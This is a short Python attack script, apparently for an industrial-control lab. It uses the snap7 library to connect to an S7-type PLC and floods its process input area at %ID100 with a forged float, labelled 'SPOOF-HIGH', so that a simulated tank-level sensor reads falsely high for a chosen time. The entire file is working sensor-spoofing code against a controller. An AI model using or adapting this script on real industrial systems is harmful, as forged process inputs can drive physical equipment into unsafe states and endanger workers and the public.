#!/usr/bin/env python3
import snap7, struct, time, sys
try: from snap7.type import Area; PE=Area.PE
except Exception: PE=0x81
HOST="192.168.2.10"; SECS=float(sys.argv[1]) if len(sys.argv)>1 else 20; VAL=float(sys.argv[2]) if len(sys.argv)>2 else 4.5
c=snap7.client.Client(); c.connect(HOST,0,1)
hi=bytearray(struct.pack('>f', VAL)); i=0; end=time.time()+SECS
print("[SPOOF-HIGH] pinning %%ID100=%.1f (Sim.Level~%.0f) for %.0fs" % (VAL, VAL*20, SECS))
try:
    while time.time()<end: c.write_area(PE,0,100,hi); i+=1
except Exception as e: print("  interrupted (%s)"%type(e).__name__)
print("[SPOOF-HIGH] done (%d writes)"%i)
